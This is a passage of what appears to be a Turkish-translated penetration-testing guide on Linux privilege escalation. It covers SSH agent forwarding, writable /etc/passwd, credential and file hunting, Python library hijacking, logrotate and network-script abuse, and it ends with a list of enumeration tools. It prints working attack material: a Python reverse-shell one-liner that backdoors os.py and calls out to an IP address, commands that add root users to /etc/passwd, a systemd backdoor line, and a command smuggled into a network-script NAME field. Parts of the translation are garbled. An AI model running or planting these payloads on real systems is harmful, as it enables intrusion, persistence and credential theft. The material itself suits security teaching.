Bu yapılandırma, eğer kullanıcı "**testusername**"ın **private** anahtarıyla giriş yapmayı denerseniz ssh'in anahtarınızın public key'ini `/home/testusername/.ssh/authorized_keys` ve `/home/testusername/access` içindekilerle karşılaştıracağını belirtir.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding, sunucunuzda (without passphrases!) anahtar bırakmak yerine **use your local SSH keys instead of leaving keys** yapmanızı sağlar. Böylece ssh ile bir **host**a **jump** yapabilir ve oradan başka bir **host**a **jump** yaparken **initial host**unuzda bulunan **key**i **using** edebilirsiniz.

Bu seçeneği `$HOME/.ssh.config` içinde şu şekilde ayarlamanız gerekir:
```
Host example.com
ForwardAgent yes
```
Dikkat: eğer `Host` `*` ise, kullanıcı her farklı makineye geçtiğinde o host anahtarlara erişebilecek (bu bir güvenlik sorunudur).

Dosya `/etc/ssh_config` bu **seçenekleri** **geçersiz kılabilir** ve bu yapılandırmaya izin verebilir veya engelleyebilir.\
Dosya `/etc/sshd_config` `AllowAgentForwarding` anahtar kelimesi ile ssh-agent forwarding'e izin verebilir veya engelleyebilir (varsayılan: allow).

Bir ortamda Forward Agent yapılandırıldığını görürseniz aşağıdaki sayfayı okuyun — **bunu suistimal ederek ayrıcalıkları yükseltebilirsiniz**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## İlginç Dosyalar

### Profil dosyaları

Dosya `/etc/profile` ve `/etc/profile.d/` altındaki dosyalar, bir kullanıcı yeni bir shell çalıştırdığında yürütülen **betiklerdir**. Bu nedenle, bunlardan herhangi birini **yazabiliyor veya değiştirebiliyorsanız ayrıcalıkları yükseltebilirsiniz**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Herhangi tuhaf bir profil betiği bulunursa, içinde **hassas ayrıntılar** olup olmadığını kontrol etmelisiniz.

### Passwd/Shadow Dosyaları

İşletim sistemine bağlı olarak `/etc/passwd` ve `/etc/shadow` dosyaları farklı bir isim taşıyabilir veya yedeği olabilir. Bu yüzden **tümünü bulun** ve dosyaları okuyup okuyamadığınızı **kontrol edin**; içlerinde **hashes** olup olmadığını görmek için:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Bazı durumlarda `/etc/passwd` (veya eşdeğeri) dosyası içinde **password hashes** bulabilirsiniz.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Yazılabilir /etc/passwd

Öncelikle, aşağıdaki komutlardan biriyle bir password oluşturun.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Sonra `hacker` kullanıcısını ekleyin ve oluşturulan parolayı ekleyin.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Örn: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Artık `su` komutunu `hacker:hacker` ile kullanabilirsiniz

Alternatif olarak, parola olmadan sahte bir kullanıcı eklemek için aşağıdaki satırları kullanabilirsiniz.\
UYARI: makinenin mevcut güvenliğini zayıflatabilirsiniz.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOT: BSD platformlarında `/etc/passwd` `/etc/pwd.db` ve `/etc/master.passwd` konumunda bulunur; ayrıca `/etc/shadow` `/etc/spwd.db` olarak yeniden adlandırılmıştır.

Bazı hassas dosyalara **write in some sensitive files** yazıp yazamayacağınızı kontrol etmelisiniz. Örneğin, bazı **service configuration file**'lara yazabiliyor musunuz?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Örneğin, eğer makine bir **tomcat** sunucusu çalıştırıyor ve **modify the Tomcat service configuration file inside /etc/systemd/,** işlemini gerçekleştirebiliyorsanız, şu satırları değiştirebilirsiniz:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor'unuz, tomcat bir sonraki başlatıldığında çalıştırılacaktır.

### Klasörleri Kontrol Et

Aşağıdaki klasörler yedekler veya ilginç bilgiler içerebilir: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Muhtemelen sonuncusunu okuyamayacaksınız ama yine de deneyin)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Garip Konum/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Son birkaç dakikada değiştirilen dosyalar
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB dosyaları
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml dosyalar
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Gizli dosyalar
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH içindeki Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web dosyaları**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Yedekler**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Parola içerebilecek bilinen dosyalar

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) kodunu inceleyin, **parola içerebilecek birkaç dosyayı** arar.\
**Kullanabileceğiniz başka ilginç bir araç**: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) yerel bilgisayarda saklanan birçok parolayı Windows, Linux & Mac için geri almak amacıyla kullanılan açık kaynaklı bir uygulamadır.

### Günlükler

Günlükleri okuyabiliyorsanız, içinde **ilginç/gizli bilgiler** bulabilirsiniz. Günlük ne kadar tuhafsa, o kadar ilginç olur (muhtemelen).\
Ayrıca, bazı "**kötü**" yapılandırılmış (backdoored?) **audit logs** size **audit logs** içinde **parolaları kaydetmenize** izin verebilir, bu şu yazıda açıklandığı gibi: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**Günlükleri okumak için grup** [**adm**](interesting-groups-linux-pe/index.html#adm-group) çok faydalı olacaktır.

### Shell dosyaları
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Ayrıca dosya adında veya içeriğinde "**password**" kelimesi geçen dosyaları kontrol etmeli, log'lar içinde IP'leri ve email'leri ya da hash'ler için regex'leri de aramalısın.\
Bunların tümünü burada nasıl yapacağını listelemeyeceğim ama ilgileniyorsan [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)'in gerçekleştirdiği son kontrolleri inceleyebilirsin.

## Yazılabilir dosyalar

### Python library hijacking

Eğer bir python scriptinin **nereden** çalıştırılacağını biliyorsan ve o klasöre **içine yazabiliyorsan** ya da **python kütüphanelerini değiştirebiliyorsan**, OS kütüphanesini değiştirip backdoor ekleyebilirsin (eğer python scriptinin çalıştırılacağı yere yazabiliyorsan, os.py kütüphanesini kopyalayıp yapıştır).

Kütüphaneyi **backdoor the library** yapmak için os.py kütüphanesinin sonuna aşağıdaki satırı ekle (IP ve PORT'u değiştir):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate`'taki bir güvenlik açığı, bir log dosyası veya üst dizinlerinde **yazma izinleri** olan kullanıcıların potansiyel olarak ayrıcalık yükseltmesine yol açabilir. Bunun nedeni, genellikle **root** olarak çalışan `logrotate`'in, özellikle _**/etc/bash_completion.d/**_ gibi dizinlerde keyfi dosyaların çalıştırılacak şekilde manipüle edilebilmesidir. İzinleri sadece _/var/log_ üzerinde değil, log rotasyonunun uygulandığı herhangi bir dizinde de kontrol etmek önemlidir.

> [!TIP]
> Bu güvenlik açığı `logrotate` sürüm `3.18.0` ve daha eski sürümleri etkiler

Daha ayrıntılı bilgi için şu sayfaya bakabilirsiniz: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Bu güvenlik açığını [**logrotten**](https://github.com/whotwagner/logrotten) ile istismar edebilirsiniz.

Bu güvenlik açığı [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** ile çok benzerdir; bu nedenle logları değiştirebildiğinizi fark ederseniz, bu logları kimin yönettiğini kontrol edin ve logları symlinks ile değiştirerek ayrıcalık yükseltmesi yapıp yapamayacağınızı test edin.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Eğer herhangi bir nedenle bir kullanıcı `_ /etc/sysconfig/network-scripts_` dizinine bir `ifcf-<whatever>` script yazabiliyorsa veya mevcut bir script'i **ayarlayabiliyorsa**, sisteminiz pwned olur.

Network script'leri, örneğin `ifcg-eth0`, ağ bağlantıları için kullanılır. Görünümleri .INI dosyalarına tamamen benzerdir. Ancak Linux'ta Network Manager (dispatcher.d) tarafından ~sourced~ edilir.

Benim durumumda, bu network script'lerinde `NAME=` olarak atanan değer düzgün işlenmiyor. İsimde boşluk varsa sistem boşluktan sonraki kısmı çalıştırmaya çalışıyor. Bu, ilk boşluktan sonraki her şeyin root olarak çalıştırılacağı anlamına gelir.

Örneğin: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network ve /bin/id arasındaki boşluğa dikkat_)

### **init, init.d, systemd, and rc.d**

The directory `/etc/init.d` is home to **scripts** for System V init (SysVinit), the **classic Linux service management system**. It includes scripts to `start`, `stop`, `restart`, and sometimes `reload` services. These can be executed directly or through symbolic links found in `/etc/rc?.d/`. An alternative path in Redhat systems is `/etc/rc.d/init.d`.

On the other hand, `/etc/init` is associated with **Upstart**, a newer **service management** introduced by Ubuntu, using configuration files for service management tasks. Despite the transition to Upstart, SysVinit scripts are still utilized alongside Upstart configurations due to a compatibility layer in Upstart.

**systemd** emerges as a modern initialization and service manager, offering advanced features such as on-demand daemon starting, automount management, and system state snapshots. It organizes files into `/usr/lib/systemd/` for distribution packages and `/etc/systemd/system/` for administrator modifications, streamlining the system administration process.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks commonly hook a syscall to expose privileged kernel functionality to a userspace manager. Weak manager authentication (e.g., signature checks based on FD-order or poor password schemes) can enable a local app to impersonate the manager and escalate to root on already-rooted devices. Learn more and exploitation details here:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery in VMware Tools/Aria Operations can extract a binary path from process command lines and execute it with -v under a privileged context. Permissive patterns (e.g., using \S) may match attacker-staged listeners in writable locations (e.g., /tmp/httpd), leading to execution as root (CWE-426 Untrusted Search Path).

Learn more and see a generalized pattern applicable to other discovery/monitoring stacks here:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
